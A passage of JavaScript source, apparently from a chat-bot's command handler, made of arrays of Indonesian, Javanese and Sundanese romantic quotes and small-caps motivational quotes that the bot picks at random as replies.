 "Sendainya kamu tahu, sampai saat ini aku masih mencintaimu.",
 "Terkadang aku iri sama layangan..talinya putus saja masih dikejar kejar dan gak rela direbut orang lain...",
 "Aku tidak tahu apa itu cinta, sampai akhirnya aku bertemu denganmu. Tapi, saat itu juga aku tahu rasanya patah hati.",
 "Mengejar itu capek, tapi lebih capek lagi menunggu\nMenunggu kamu menyadari keberadaanku...",
 "Jangan berhenti mencinta hanya karena pernah terluka. Karena tak ada pelangi tanpa hujan, tak ada cinta sejati tanpa tangisan.",
 "Aku punya sejuta alasan unutk melupakanmu, tapi tak ada yang bisa memaksaku untuk berhenti mencintaimu.",
 "Terkadang seseorang terasa sangat bodoh hanya untuk mencintai seseorang.",
 "Kamu adalah patah hati terbaik yang gak pernah aku sesali.",
 "Bukannya tak pantas ditunggu, hanya saja sering memberi harapan palsu.",
 "Sebagian diriku merasa sakit, Mengingat dirinya yang sangat dekat, tapi tak tersentuh.",
 "Hal yang terbaik dalam mencintai seseorang adalah dengan diam-diam mendo akannya.",
 "Kuharap aku bisa menghilangkan perasaan ini secepat aku kehilanganmu.",
 "Demi cinta kita menipu diri sendiri. Berusaha kuat nyatanya jatuh secara tak terhormat.",
 "Anggaplah aku rumahmu, jika kamu pergi kamu mengerti kemana arah pulang. Menetaplah bila kamu mau dan pergilah jika kamu bosan...",
 "Aku bingung, apakah aku harus kecewa atu tidak? Jika aku kecewa, emang siapa diriku baginya?\n\nKalau aku tidak kecewa, tapi aku menunggu ucapannya.",
 "Rinduku seperti ranting yang tetap berdiri.Meski tak satupun lagi dedaunan yang menemani, sampai akhirnya mengering, patah, dan mati.",
 "Kurasa kita sekarang hanya dua orang asing yang memiliki kenangan yang sama.",
 "Buatlah aku bisa membencimu walau hanya beberapa menit, agar tidak terlalu berat untuk melupakanmu.",
 "Aku mencintaimu dengan segenap hatiku, tapi kau malah membagi perasaanmu dengan orang lain.",
 "Mencintaimu mungkin menghancurkanku, tapi entah bagaimana meninggalkanmu tidak memperbaikiku.",
 "Kamu adalah yang utama dan pertama dalam hidupku. Tapi, aku adalah yang kedua bagimu.",
 "Jika kita hanya bisa dipertemukan dalam mimpi, aku ingin tidur selamanya.",
 "Melihatmu bahagia adalah kebahagiaanku, walaupun bahagiamu tanpa bersamaku.",
 "Aku terkadang iri dengan sebuah benda. Tidak memiliki rasa namun selalu dibutuhkan. Berbeda dengan aku yang memiliki rasa, namun ditinggalkan dan diabaikan...",
 "Bagaimana mungkin aku berpindah jika hanya padamu hatiku bersinggah?",
 "Kenangan tentangmu sudah seperti rumah bagiku. Sehingga setiap kali pikiranku melayang, pasti ujung-ujungnya akan selalu kembali kepadamu.",
 "Kenapa tisue bermanfaat? Karena cinta tak pernah kemarau. - Sujiwo Tejo",
 "Kalau mencintaimu adalah kesalahan, yasudah, biar aku salah terus saja.",
 "Sejak kenal kamu, aku jadi pengen belajar terus deh. Belajar jadi yang terbaik buat kamu.",
 "Ada yang bertingkah bodoh hanya untuk melihatmu tersenyum. Dan dia merasa bahagia akan hal itu.",
 "Aku bukan orang baik, tapi akan belajar jadi yang terbaik untuk kamu.",
 "Kita tidak mati, tapi lukanya yang membuat kita tidak bisa berjalan seperti dulu lagi.",
 "keberadaanmu bagaikan secangkir kopi yang aku butuhkan setiap pagi, yang dapat mendorongku untuk tetap bersemangat menjalani hari.",
 "Aku mau banget ngasih dunia ke kamu. Tapi karena itu nggak mungkin, maka aku akan kasih hal yang paling penting dalam hidupku, yaitu duniaku.",
 "Mending sing humoris tapi manis, ketimbang sok romantis tapi akhire tragis.",
 "Ben akhire ora kecewa, dewe kudu ngerti kapan waktune berharap lan kapan kudu mandeg.",
 "Aku ki wong Jowo seng ora ngerti artine 'I Love U'. Tapi aku ngertine mek 'Aku tresno awakmu'.",
 "Ora perlu ayu lan sugihmu, aku cukup mok setiani wes seneng ra karuan.",
 "Cintaku nang awakmu iku koyok kamera, fokus nang awakmu tok liyane mah ngeblur.",
 "Saben dino kegowo ngimpi tapi ora biso nduweni.",
 "Ora ketemu koe 30 dino rasane koyo sewulan.",
 "Aku tanpamu bagaikan sego kucing ilang karete. Ambyar.",
 "Pengenku, Aku iso muter wektu. Supoyo aku iso nemokne kowe lewih gasik. Ben Lewih dowo wektuku kanggo urip bareng sliramu.",
 "Aku ora pernah ngerti opo kui tresno, kajaba sak bare ketemu karo sliramu.",
 "Cinta aa ka neng moal leungit-leungit sanajan aa geus kawin deui.",
 "Kasabaran kaula aya batasna, tapi cinta kaula ka anjeun henteu aya se epna.",
 "Kanyaah akang moal luntur najan make Bayclean.",
 "Kenangan endah keur babarengan jeung anjeun ek tuluy diinget-inget nepi ka poho.",
 "Kuring moal bakal tiasa hirup sorangan, butuh bantosan jalmi sejen.",
 "Nyaahna aa ka neg teh jiga tukang bank keur nagih hutang (hayoh mumuntil).",
 "Kasabaran urang aya batasna, tapi cinta urang ka maneh moal aya beakna.",
 "Hayang rasana kuring ngarangkai kabeh kata cinta anu aya di dunya ieu, terus bade ku kuring kumpulkeun, supaya anjeun nyaho gede pisan rasa cinta kuring ka anjeun.",
 "Tenang wae neng, ari cinta Akang mah sapertos tembang krispatih; Tak lekang oleh waktu.",
 "Abdi sanes jalmi nu sampurna pikeun anjeun, sareng sanes oge nu paling alus kanggo anjeun. Tapi nu pasti, abdi jalmi hiji-hijina nu terus emut ka anjeun.",
 "Cukup jaringan aja yang hilang, kamu jangan.",
 "Sering sih dibikin makan ati. Tapi menyadari kamu masih di sini bikin bahagia lagi.",
 "Musuhku adalah mereka yang ingin memilikimu juga.",
 "Banyak yang selalu ada, tapi kalo cuma kamu yang aku mau, gimana?",
 "Jam tidurku hancur dirusak rindu.",
 "Cukup China aja yang jauh, cinta kita jangan.",
 "Yang penting itu kebahagiaan kamu, aku sih gak penting..",
 "Cuma satu keinginanku, dicintai olehmu..",
 "Aku tanpamu bagaikan ambulans tanpa wiuw wiuw wiuw.",
 "Cukup antartika aja yang jauh. Antarkita jangan."
]
const Kyyhsttruth = bucin[Math.floor(Math.random() * bucin.length)]
	reply(`${Kyyhsttruth}`)
}
break

case 'quotesmotivasi': {
function pickRandom(list) {
 return list[Math.floor(list.length * Math.random())]
}

const motivasi = [
"ᴊᴀɴɢᴀɴ ʙɪᴄᴀʀᴀ, ʙᴇʀᴛɪɴᴅᴀᴋ ꜱᴀᴊᴀ. ᴊᴀɴɢᴀɴ ᴋᴀᴛᴀᴋᴀɴ, ᴛᴜɴᴊᴜᴋᴋᴀɴ ꜱᴀᴊᴀ. ᴊᴀɴɢᴀɴ ᴊᴀɴᴊɪ, ʙᴜᴋᴛɪᴋᴀɴ ꜱᴀᴊᴀ.",
"ᴊᴀɴɢᴀɴ ᴘᴇʀɴᴀʜ ʙᴇʀʜᴇɴᴛɪ ᴍᴇʟᴀᴋᴜᴋᴀɴ ʏᴀɴɢ ᴛᴇʀʙᴀɪᴋ ʜᴀɴʏᴀ ᴋᴀʀᴇɴᴀ ꜱᴇꜱᴇᴏʀᴀɴɢ ᴛɪᴅᴀᴋ ᴍᴇᴍʙᴇʀɪ ᴀɴᴅᴀ ᴘᴇɴɢʜᴀʀɢᴀᴀɴ.",
"ʙᴇᴋᴇʀᴊᴀ ꜱᴀᴀᴛ ᴍᴇʀᴇᴋᴀ ᴛɪᴅᴜʀ. ʙᴇʟᴀᴊᴀʀ ꜱᴀᴀᴛ ᴍᴇʀᴇᴋᴀ ʙᴇʀᴘᴇꜱᴛᴀ. ʜᴇᴍᴀᴛ ꜱᴇᴍᴇɴᴛᴀʀᴀ ᴍᴇʀᴇᴋᴀ ᴍᴇɴɢʜᴀʙɪꜱᴋᴀɴ. ʜɪᴅᴜᴘʟᴀʜ ꜱᴇᴘᴇʀᴛɪ ᴍɪᴍᴘɪ ᴍᴇʀᴇᴋᴀ.",
"ᴋᴜɴᴄɪ ꜱᴜᴋꜱᴇꜱ ᴀᴅᴀʟᴀʜ ᴍᴇᴍᴜꜱᴀᴛᴋᴀɴ ᴘɪᴋɪʀᴀɴ ꜱᴀᴅᴀʀ ᴋɪᴛᴀ ᴘᴀᴅᴀ ʜᴀʟ-ʜᴀʟ ʏᴀɴɢ ᴋɪᴛᴀ ɪɴɢɪɴᴋᴀɴ, ʙᴜᴋᴀɴ ʜᴀʟ-ʜᴀʟ ʏᴀɴɢ ᴋɪᴛᴀ ᴛᴀᴋᴜᴛɪ.",
"ᴊᴀɴɢᴀɴ ᴛᴀᴋᴜᴛ ɢᴀɢᴀʟ. ᴋᴇᴛᴀᴋᴜᴛᴀɴ ʙᴇʀᴀᴅᴀ ᴅɪ ᴛᴇᴍᴘᴀᴛ ʏᴀɴɢ ꜱᴀᴍᴀ ᴛᴀʜᴜɴ ᴅᴇᴘᴀɴ ꜱᴇᴘᴇʀᴛɪ ᴀɴᴅᴀ ꜱᴀᴀᴛ ɪɴɪ.",
"ᴊɪᴋᴀ ᴋɪᴛᴀ ᴛᴇʀᴜꜱ ᴍᴇʟᴀᴋᴜᴋᴀɴ ᴀᴘᴀ ʏᴀɴɢ ᴋɪᴛᴀ ʟᴀᴋᴜᴋᴀɴ, ᴋɪᴛᴀ ᴀᴋᴀɴ ᴛᴇʀᴜꜱ ᴍᴇɴᴅᴀᴘᴀᴛᴋᴀɴ ᴀᴘᴀ ʏᴀɴɢ ᴋɪᴛᴀ ᴅᴀᴘᴀᴛᴋᴀɴ.",
"ᴊɪᴋᴀ ᴀɴᴅᴀ ᴛɪᴅᴀᴋ ᴅᴀᴘᴀᴛ ᴍᴇɴɢᴀᴛᴀꜱɪ ꜱᴛʀᴇꜱ, ᴀɴᴅᴀ ᴛɪᴅᴀᴋ ᴀᴋᴀɴ ᴍᴇɴɢᴇʟᴏʟᴀ ᴋᴇꜱᴜᴋꜱᴇꜱᴀɴ.",
"ʙᴇʀꜱɪᴋᴀᴘ ᴋᴇʀᴀꜱ ᴋᴇᴘᴀʟᴀ ᴛᴇɴᴛᴀɴɢ ᴛᴜᴊᴜᴀɴ ᴀɴᴅᴀ ᴅᴀɴ ꜰʟᴇᴋꜱɪʙᴇʟ ᴛᴇɴᴛᴀɴɢ ᴍᴇᴛᴏᴅᴇ ᴀɴᴅᴀ.",
"ᴋᴇʀᴊᴀ ᴋᴇʀᴀꜱ ᴍᴇɴɢᴀʟᴀʜᴋᴀɴ ʙᴀᴋᴀᴛ ᴋᴇᴛɪᴋᴀ ʙᴀᴋᴀᴛ ᴛɪᴅᴀᴋ ʙᴇᴋᴇʀᴊᴀ ᴋᴇʀᴀꜱ.",
"ɪɴɢᴀᴛʟᴀʜ ʙᴀʜᴡᴀ ᴘᴇʟᴀᴊᴀʀᴀɴ ᴛᴇʀʙᴇꜱᴀʀ ᴅᴀʟᴀᴍ ʜɪᴅᴜᴘ ʙɪᴀꜱᴀɴʏᴀ ᴅɪᴘᴇʟᴀᴊᴀʀɪ ᴅᴀʀɪ ꜱᴀᴀᴛ-ꜱᴀᴀᴛ ᴛᴇʀʙᴜʀᴜᴋ ᴅᴀɴ ᴅᴀʀɪ ᴋᴇꜱᴀʟᴀʜᴀɴ ᴛᴇʀʙᴜʀᴜᴋ.",
"ʜɪᴅᴜᴘ ʙᴜᴋᴀɴ ᴛᴇɴᴛᴀɴɢ ᴍᴇɴᴜɴɢɢᴜ ʙᴀᴅᴀɪ ʙᴇʀʟᴀʟᴜ, ᴛᴇᴛᴀᴘɪ ʙᴇʟᴀᴊᴀʀ ᴍᴇɴᴀʀɪ ᴅɪ ᴛᴇɴɢᴀʜ ʜᴜᴊᴀɴ.",
"ᴊɪᴋᴀ ʀᴇɴᴄᴀɴᴀɴʏᴀ ᴛɪᴅᴀᴋ ʙᴇʀʜᴀꜱɪʟ, ᴜʙᴀʜ ʀᴇɴᴄᴀɴᴀɴʏᴀ ʙᴜᴋᴀɴ ᴛᴜᴊᴜᴀɴɴʏᴀ.",
"ᴊᴀɴɢᴀɴ ᴛᴀᴋᴜᴛ ᴋᴀʟᴀᴜ ʜɪᴅᴜᴘᴍᴜ ᴀᴋᴀɴ ʙᴇʀᴀᴋʜɪʀ; ᴛᴀᴋᴜᴛʟᴀʜ ᴋᴀʟᴀᴜ ʜɪᴅᴜᴘᴍᴜ ᴛᴀᴋ ᴘᴇʀɴᴀʜ ᴅɪᴍᴜʟᴀɪ.",
"ᴏʀᴀɴɢ ʏᴀɴɢ ʙᴇɴᴀʀ-ʙᴇɴᴀʀ ʜᴇʙᴀᴛ ᴀᴅᴀʟᴀʜ ᴏʀᴀɴɢ ʏᴀɴɢ ᴍᴇᴍʙᴜᴀᴛ ꜱᴇᴛɪᴀᴘ ᴏʀᴀɴɢ ᴍᴇʀᴀꜱᴀ ʜᴇʙᴀᴛ.",
"ᴘᴇɴɢᴀʟᴀᴍᴀɴ ᴀᴅᴀʟᴀʜ ɢᴜʀᴜ ʏᴀɴɢ ʙᴇʀᴀᴛ ᴋᴀʀᴇɴᴀ ᴅɪᴀ ᴍᴇᴍʙᴇʀɪᴋᴀɴ ᴛᴇꜱ ᴛᴇʀʟᴇʙɪʜ ᴅᴀʜᴜʟᴜ, ᴋᴇᴍᴜᴅɪᴀɴ ᴘᴇʟᴀᴊᴀʀᴀɴɴʏᴀ.",
"ᴍᴇɴɢᴇᴛᴀʜᴜɪ ꜱᴇʙᴇʀᴀᴘᴀ ʙᴀɴʏᴀᴋ ʏᴀɴɢ ᴘᴇʀʟᴜ ᴅɪᴋᴇᴛᴀʜᴜɪ ᴀᴅᴀʟᴀʜ ᴀᴡᴀʟ ᴅᴀʀɪ ʙᴇʟᴀᴊᴀʀ ᴜɴᴛᴜᴋ ʜɪᴅᴜᴘ.",
"ꜱᴜᴋꜱᴇꜱ ʙᴜᴋᴀɴʟᴀʜ ᴀᴋʜɪʀ, ᴋᴇɢᴀɢᴀʟᴀɴ ᴛɪᴅᴀᴋ ꜰᴀᴛᴀʟ. ʏᴀɴɢ ᴛᴇʀᴘᴇɴᴛɪɴɢ ᴀᴅᴀʟᴀʜ ᴋᴇʙᴇʀᴀɴɪᴀɴ ᴜɴᴛᴜᴋ ᴍᴇʟᴀɴᴊᴜᴛᴋᴀɴ.",
"ʟᴇʙɪʜ ʙᴀɪᴋ ɢᴀɢᴀʟ ᴅᴀʟᴀᴍ ᴏʀɪꜱɪɴᴀʟɪᴛᴀꜱ ᴅᴀʀɪᴘᴀᴅᴀ ʙᴇʀʜᴀꜱɪʟ ᴍᴇɴɪʀᴜ.",
"ʙᴇʀᴀɴɪ ʙᴇʀᴍɪᴍᴘɪ, ᴛᴀᴘɪ ʏᴀɴɢ ʟᴇʙɪʜ ᴘᴇɴᴛɪɴɢ, ʙᴇʀᴀɴɪ ᴍᴇʟᴀᴋᴜᴋᴀɴ ᴛɪɴᴅᴀᴋᴀɴ ᴅɪ ʙᴀʟɪᴋ ɪᴍᴘɪᴀɴᴍᴜ.",
"ᴛᴇᴛᴀᴘᴋᴀɴ ᴛᴜᴊᴜᴀɴ ᴀɴᴅᴀ ᴛɪɴɢɢɪ-ᴛɪɴɢɢɪ, ᴅᴀɴ ᴊᴀɴɢᴀɴ ʙᴇʀʜᴇɴᴛɪ ꜱᴀᴍᴘᴀɪ ᴀɴᴅᴀ ᴍᴇɴᴄᴀᴘᴀɪɴʏᴀ.",
"ᴋᴇᴍʙᴀɴɢᴋᴀɴ ᴋᴇꜱᴜᴋꜱᴇꜱᴀɴ ᴅᴀʀɪ ᴋᴇɢᴀɢᴀʟᴀɴ. ᴋᴇᴘᴜᴛᴜꜱᴀꜱᴀᴀɴ ᴅᴀɴ ᴋᴇɢᴀɢᴀʟᴀɴ ᴀᴅᴀʟᴀʜ ᴅᴜᴀ ʙᴀᴛᴜ ʟᴏɴᴄᴀᴛᴀɴ ᴘᴀʟɪɴɢ ᴘᴀꜱᴛɪ ᴍᴇɴᴜᴊᴜ ꜱᴜᴋꜱᴇꜱ.",
"ᴊᴇɴɪᴜꜱ ᴀᴅᴀʟᴀʜ ꜱᴀᴛᴜ ᴘᴇʀꜱᴇɴ ɪɴꜱᴘɪʀᴀꜱɪ ᴅᴀɴ ꜱᴇᴍʙɪʟᴀɴ ᴘᴜʟᴜʜ ꜱᴇᴍʙɪʟᴀɴ ᴘᴇʀꜱᴇɴ ᴋᴇʀɪɴɢᴀᴛ.",
"ꜱᴜᴋꜱᴇꜱ ᴀᴅᴀʟᴀʜ ᴛᴇᴍᴘᴀᴛ ᴘᴇʀꜱɪᴀᴘᴀɴ ᴅᴀɴ ᴋᴇꜱᴇᴍᴘᴀᴛᴀɴ ʙᴇʀᴛᴇᴍᴜ.",
"ᴋᴇᴛᴇᴋᴜɴᴀɴ ɢᴀɢᴀʟ 19 ᴋᴀʟɪ ᴅᴀɴ ʙᴇʀʜᴀꜱɪʟ ᴘᴀᴅᴀ ᴋᴇꜱᴇᴍᴘᴀᴛᴀᴍ ʏᴀɴɢ ᴋᴇ-20.",
"ᴊᴀʟᴀɴ ᴍᴇɴᴜᴊᴜ ꜱᴜᴋꜱᴇꜱ ᴅᴀɴ ᴊᴀʟᴀɴ ᴍᴇɴᴜᴊᴜ ᴋᴇɢᴀɢᴀʟᴀɴ ʜᴀᴍᴘɪʀ ᴘᴇʀꜱɪꜱ ꜱᴀᴍᴀ.",
"ꜱᴜᴋꜱᴇꜱ ʙɪᴀꜱᴀɴʏᴀ ᴅᴀᴛᴀɴɢ ᴋᴇᴘᴀᴅᴀ ᴍᴇʀᴇᴋᴀ ʏᴀɴɢ ᴛᴇʀʟᴀʟᴜ ꜱɪʙᴜᴋ ᴍᴇɴᴄᴀʀɪɴʏᴀ.",
"ᴊᴀɴɢᴀɴ ᴛᴜɴᴅᴀ ᴘᴇᴋᴇʀᴊᴀᴀɴᴍᴜ ꜱᴀᴍᴘᴀɪ ʙᴇꜱᴏᴋ, ꜱᴇᴍᴇɴᴛᴀʀᴀ ᴋᴀᴜ ʙɪꜱᴀ ᴍᴇɴɢᴇʀᴊᴀᴋᴀɴɴʏᴀ ʜᴀʀɪ ɪɴɪ.",
"20 ᴛᴀʜᴜɴ ᴅᴀʀɪ ꜱᴇᴋᴀʀᴀɴɢ, ᴋᴀᴜ ᴍᴜɴɢᴋɪɴ ʟᴇʙɪʜ ᴋᴇᴄᴇᴡᴀ ᴅᴇɴɢᴀɴ ʜᴀʟ-ʜᴀʟ ʏᴀɴɢ ᴛɪᴅᴀᴋ ꜱᴇᴍᴘᴀᴛ ᴋᴀᴜ ʟᴀᴋᴜᴋᴀɴ ᴀʟɪʜ-ᴀʟɪʜ ʏᴀɴɢ ꜱᴜᴅᴀʜ.",
"ᴊᴀɴɢᴀɴ ʜᴀʙɪꜱᴋᴀɴ ᴡᴀᴋᴛᴜᴍᴜ ᴍᴇᴍᴜᴋᴜʟɪ ᴛᴇᴍʙᴏᴋ ᴅᴀɴ ʙᴇʀʜᴀʀᴀᴘ ʙɪꜱᴀ ᴍᴇɴɢᴜʙᴀʜɴʏᴀ ᴍᴇɴᴊᴀᴅɪ ᴘɪɴᴛᴜ.",
"ᴋᴇꜱᴇᴍᴘᴀᴛᴀɴ ɪᴛᴜ ᴍɪʀɪᴘ ꜱᴇᴘᴇʀᴛɪ ᴍᴀᴛᴀʜᴀʀɪ ᴛᴇʀʙɪᴛ. ᴋᴀʟᴀᴜ ᴋᴀᴜ ᴍᴇɴᴜɴɢɢᴜ ᴛᴇʀʟᴀʟᴜ ʟᴀᴍᴀ, ᴋᴀᴜ ʙɪꜱᴀ ᴍᴇʟᴇᴡᴀᴛᴋᴀɴɴʏᴀ.",
"ʜɪᴅᴜᴘ ɪɴɪ ᴛᴇʀᴅɪʀɪ ᴅᴀʀɪ 10 ᴘᴇʀꜱᴇɴ ᴀᴘᴀ ʏᴀɴɢ ᴛᴇʀᴊᴀᴅɪ ᴘᴀᴅᴀᴍᴜ ᴅᴀɴ 90 ᴘᴇʀꜱᴇɴ ʙᴀɢᴀɪᴍᴀɴᴀ ᴄᴀʀᴀᴍᴜ ᴍᴇɴʏɪᴋᴀᴘɪɴʏᴀ.",
"ᴀᴅᴀ ᴛɪɢᴀ ᴄᴀʀᴀ ᴜɴᴛᴜᴋ ᴍᴇɴᴄᴀᴘᴀɪ ᴋᴇꜱᴜᴋꜱᴇꜱᴀɴ ᴛᴇʀᴛɪɴɢɢɪ: ᴄᴀʀᴀ ᴘᴇʀᴛᴀᴍᴀ ᴀᴅᴀʟᴀʜ ʙᴇʀꜱɪᴋᴀᴘ ʙᴀɪᴋ. ᴄᴀʀᴀ ᴋᴇᴅᴜᴀ ᴀᴅᴀʟᴀʜ ʙᴇʀꜱɪᴋᴀᴘ ʙᴀɪᴋ. ᴄᴀʀᴀ ᴋᴇᴛɪɢᴀ ᴀᴅᴀʟᴀʜ ᴍᴇɴᴊᴀᴅɪ ʙᴀɪᴋ.",
"ᴀʟᴀꜱᴀɴ ɴᴏᴍᴏʀ ꜱᴀᴛᴜ ᴏʀᴀɴɢ ɢᴀɢᴀʟ ᴅᴀʟᴀᴍ ʜɪᴅᴜᴘ ᴀᴅᴀʟᴀʜ ᴋᴀʀᴇɴᴀ ᴍᴇʀᴇᴋᴀ ᴍᴇɴᴅᴇɴɢᴀʀᴋᴀɴ ᴛᴇᴍᴀɴ, ᴋᴇʟᴜᴀʀɢᴀ, ᴅᴀɴ ᴛᴇᴛᴀɴɢɢᴀ ᴍᴇʀᴇᴋᴀ.",
"ᴡᴀᴋᴛᴜ ʟᴇʙɪʜ ʙᴇʀʜᴀʀɢᴀ ᴅᴀʀɪᴘᴀᴅᴀ ᴜᴀɴɢ. ᴋᴀᴍᴜ ʙɪꜱᴀ ᴍᴇɴᴅᴀᴘᴀᴛᴋᴀɴ ʟᴇʙɪʜ ʙᴀɴʏᴀᴋ ᴜᴀɴɢ, ᴛᴇᴛᴀᴘɪ ᴋᴀᴍᴜ ᴛɪᴅᴀᴋ ʙɪꜱᴀ ᴍᴇɴᴅᴀᴘᴀᴛᴋᴀɴ ʟᴇʙɪʜ ʙᴀɴʏᴀᴋ ᴡᴀᴋᴛᴜ.",
"ᴘᴇɴᴇᴛᴀᴘᴀɴ ᴛᴜᴊᴜᴀɴ ᴀᴅᴀʟᴀʜ ʀᴀʜᴀꜱɪᴀ ᴍᴀꜱᴀ ᴅᴇᴘᴀɴ ʏᴀɴɢ ᴍᴇɴᴀʀɪᴋ.",
"ꜱᴀᴀᴛ ᴋɪᴛᴀ ʙᴇʀᴜꜱᴀʜᴀ ᴜɴᴛᴜᴋ ᴍᴇɴᴊᴀᴅɪ ʟᴇʙɪʜ ʙᴀɪᴋ ᴅᴀʀɪ ᴋɪᴛᴀ, ꜱᴇɢᴀʟᴀ ꜱᴇꜱᴜᴀᴛᴜ ᴅɪ ꜱᴇᴋɪᴛᴀʀ ᴋɪᴛᴀ ᴊᴜɢᴀ ᴍᴇɴᴊᴀᴅɪ ʟᴇʙɪʜ ʙᴀɪᴋ.",
"ᴘᴇʀᴛᴜᴍʙᴜʜᴀɴ ᴅɪᴍᴜʟᴀɪ ᴋᴇᴛɪᴋᴀ ᴋɪᴛᴀ ᴍᴜʟᴀɪ ᴍᴇɴᴇʀɪᴍᴀ ᴋᴇʟᴇᴍᴀʜᴀɴ ᴋɪᴛᴀ ꜱᴇɴᴅɪʀɪ.",
"ᴊᴀɴɢᴀɴʟᴀʜ ᴘᴇʀɴᴀʜ ᴍᴇɴʏᴇʀᴀʜ ᴋᴇᴛɪᴋᴀ ᴀɴᴅᴀ ᴍᴀꜱɪʜ ᴍᴀᴍᴘᴜ ʙᴇʀᴜꜱᴀʜᴀ ʟᴀɢɪ. ᴛɪᴅᴀᴋ ᴀᴅᴀ ᴋᴀᴛᴀ ʙᴇʀᴀᴋʜɪʀ ꜱᴀᴍᴘᴀɪ ᴀɴᴅᴀ ʙᴇʀʜᴇɴᴛɪ ᴍᴇɴᴄᴏʙᴀ.",
"ᴋᴇᴍᴀᴜᴀɴ ᴀᴅᴀʟᴀʜ ᴋᴜɴᴄɪ ꜱᴜᴋꜱᴇꜱ. ᴏʀᴀɴɢ-ᴏʀᴀɴɢ ꜱᴜᴋꜱᴇꜱ, ʙᴇʀᴜꜱᴀʜᴀ ᴋᴇʀᴀꜱ ᴀᴘᴀ ᴘᴜɴ ʏᴀɴɢ ᴍᴇʀᴇᴋᴀ ʀᴀꜱᴀᴋᴀɴ ᴅᴇɴɢᴀɴ ᴍᴇɴᴇʀᴀᴘᴋᴀɴ ᴋᴇɪɴɢɪɴᴀɴ ᴍᴇʀᴇᴋᴀ ᴜɴᴛᴜᴋ ᴍᴇɴɢᴀᴛᴀꜱɪ ꜱɪᴋᴀᴘ ᴀᴘᴀᴛɪꜱ, ᴋᴇʀᴀɢᴜᴀɴ ᴀᴛᴀᴜ ᴋᴇᴛᴀᴋᴜᴛᴀɴ.",
"ᴊᴀɴɢᴀɴʟᴀʜ ᴘᴇʀɴᴀʜ ᴍᴇɴʏᴇʀᴀʜ ᴋᴇᴛɪᴋᴀ ᴀɴᴅᴀ ᴍᴀꜱɪʜ ᴍᴀᴍᴘᴜ ʙᴇʀᴜꜱᴀʜᴀ ʟᴀɢɪ. ᴛɪᴅᴀᴋ ᴀᴅᴀ ᴋᴀᴛᴀ ʙᴇʀᴀᴋʜɪʀ ꜱᴀᴍᴘᴀɪ ᴀɴᴅᴀ ʙᴇʀʜᴇɴᴛɪ ᴍᴇɴᴄᴏʙᴀ.",
"ᴋᴇᴍᴀᴜᴀɴ ᴀᴅᴀʟᴀʜ ᴋᴜɴᴄɪ ꜱᴜᴋꜱᴇꜱ. ᴏʀᴀɴɢ-ᴏʀᴀɴɢ ꜱᴜᴋꜱᴇꜱ, ʙᴇʀᴜꜱᴀʜᴀ ᴋᴇʀᴀꜱ ᴀᴘᴀ ᴘᴜɴ ʏᴀɴɢ ᴍᴇʀᴇᴋᴀ ʀᴀꜱᴀᴋᴀɴ ᴅᴇɴɢᴀɴ ᴍᴇɴᴇʀᴀᴘᴋᴀɴ ᴋᴇɪɴɢɪɴᴀɴ ᴍᴇʀᴇᴋᴀ ᴜɴᴛᴜᴋ ᴍᴇɴɢᴀᴛᴀꜱɪ ꜱɪᴋᴀᴘ ᴀᴘᴀᴛɪꜱ, ᴋᴇʀᴀɢᴜᴀɴ ᴀᴛᴀᴜ ᴋᴇᴛᴀᴋᴜᴛᴀɴ.",
"ʜᴀʟ ᴘᴇʀᴛᴀᴍᴀ ʏᴀɴɢ ᴅɪʟᴀᴋᴜᴋᴀɴ ᴏʀᴀɴɢ ꜱᴜᴋꜱᴇꜱ ᴀᴅᴀʟᴀʜ ᴍᴇᴍᴀɴᴅᴀɴɢ ᴋᴇɢᴀɢᴀʟᴀɴ ꜱᴇʙᴀɢᴀɪ ꜱɪɴʏᴀʟ ᴘᴏꜱɪᴛɪꜰ ᴜɴᴛᴜᴋ ꜱᴜᴋꜱᴇꜱ.",
"ᴄɪʀɪ ᴋʜᴀꜱ ᴏʀᴀɴɢ ꜱᴜᴋꜱᴇꜱ ᴀᴅᴀʟᴀʜ ᴍᴇʀᴇᴋᴀ ꜱᴇʟᴀʟᴜ ʙᴇʀᴜꜱᴀʜᴀ ᴋᴇʀᴀꜱ ᴜɴᴛᴜᴋ ᴍᴇᴍᴘᴇʟᴀᴊᴀʀɪ ʜᴀʟ-ʜᴀʟ ʙᴀʀᴜ.",
"ꜱᴜᴋꜱᴇꜱ ᴀᴅᴀʟᴀʜ ᴍᴇɴᴅᴀᴘᴀᴛᴋᴀɴ ᴀᴘᴀ ʏᴀɴɢ ᴋᴀᴍᴜ ɪɴɢɪɴᴋᴀɴ, ᴋᴇʙᴀʜᴀɢɪᴀᴀɴ ᴍᴇɴɢɪɴɢɪɴᴋᴀɴ ᴀᴘᴀ ʏᴀɴɢ ᴋᴀᴍᴜ ᴅᴀᴘᴀᴛᴋᴀɴ.",
"ᴏʀᴀɴɢ ᴘᴇꜱɪᴍɪꜱ ᴍᴇʟɪʜᴀᴛ ᴋᴇꜱᴜʟɪᴛᴀɴ ᴅɪ ꜱᴇᴛɪᴀᴘ ᴋᴇꜱᴇᴍᴘᴀᴛᴀɴ. ᴏʀᴀɴɢ ʏᴀɴɢ ᴏᴘᴛɪᴍɪꜱ ᴍᴇʟɪʜᴀᴛ ᴘᴇʟᴜᴀɴɢ ᴅᴀʟᴀᴍ ꜱᴇᴛɪᴀᴘ ᴋᴇꜱᴜʟɪᴛᴀɴ.",
"ᴋᴇʀᴀɢᴜᴀɴ ᴍᴇᴍʙᴜɴᴜʜ ʟᴇʙɪʜ ʙᴀɴʏᴀᴋ ᴍɪᴍᴘɪ ᴅᴀʀɪᴘᴀᴅᴀ ᴋᴇɢᴀɢᴀʟᴀɴ.",
"ʟᴀᴋᴜᴋᴀɴ ᴀᴘᴀ ʏᴀɴɢ ʜᴀʀᴜꜱ ᴋᴀᴍᴜ ʟᴀᴋᴜᴋᴀɴ ꜱᴀᴍᴘᴀɪ ᴋᴀᴍᴜ ᴅᴀᴘᴀᴛ ᴍᴇʟᴀᴋᴜᴋᴀɴ ᴀᴘᴀ ʏᴀɴɢ ɪɴɢɪɴ ᴋᴀᴍᴜ ʟᴀᴋᴜᴋᴀɴ.",
"ᴏᴘᴛɪᴍɪꜱᴛɪꜱ ᴀᴅᴀʟᴀʜ ꜱᴀʟᴀʜ ꜱᴀᴛᴜ ᴋᴜᴀʟɪᴛᴀꜱ ʏᴀɴɢ ʟᴇʙɪʜ ᴛᴇʀᴋᴀɪᴛ ᴅᴇɴɢᴀɴ ᴋᴇꜱᴜᴋꜱᴇꜱᴀɴ ᴅᴀɴ ᴋᴇʙᴀʜᴀɢɪᴀᴀɴ ᴅᴀʀɪᴘᴀᴅᴀ ʏᴀɴɢ ʟᴀɪɴ.",
